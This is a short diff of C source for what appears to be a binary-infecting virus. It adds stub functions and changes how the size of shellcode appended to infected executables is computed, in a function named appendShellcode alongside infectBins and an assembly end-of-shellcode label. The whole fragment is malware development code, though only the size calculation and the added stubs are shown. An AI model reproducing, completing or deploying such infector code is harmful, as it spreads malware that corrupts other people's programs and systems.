@@ -24,6 +24,8 @@ struct  linux_dirent {
 };
 
 static void end(void);
+static void lambdaEnd(void);
+static void lambdaStart(void);
 static int  infectBins(const char *dirname);
 
 int   entry_point(void *magic) {
@@ -314,8 +316,7 @@ static int  appendShellcode(struct bfile *bin) {
   struct bfile  new;
   size_t  size;
 
-  // TODO Replace 7 by size of last instructions
-  size = end - start + 7;
+  size = end - start + (lambdaEnd - lambdaStart);
   new.size = bin->size + size + 5;
   if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
     return (-1);
@@ -432,5 +433,8 @@ static int  infectBins(const char *dirname) {
   return (0);
 }
 
-static void    end(void) {}
+static void   lambdaStart(void) {}
+static void   lambdaEnd(void) {}
+
+static void   end(void) {}
 asm("endSC:");
